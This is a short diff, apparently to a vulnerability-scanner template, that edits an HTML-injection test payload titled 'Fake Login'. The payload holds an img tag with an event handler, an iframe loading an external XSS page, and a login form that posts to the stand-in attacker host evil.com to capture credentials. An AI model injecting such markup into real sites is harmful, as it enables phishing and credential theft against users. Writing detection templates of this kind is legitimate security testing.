@@ -7,7 +7,7 @@ info:
         <h1>HTML Injection By mega7: Fake Login</h1>
     </div>
     <div class="form-container">
-        <img src=x onany=a(1)>
+        <img onany=a(1) src=x id=1 what=a>
         <iframe src="https://megaman777.github.io/xss/"></iframe>
         <img src="https://nuclei-us-west-1.s3.us-west-1.amazonaws.com/nuclei.svg">
         <form action="https://evil.com/login" method="post" class="form-signin">
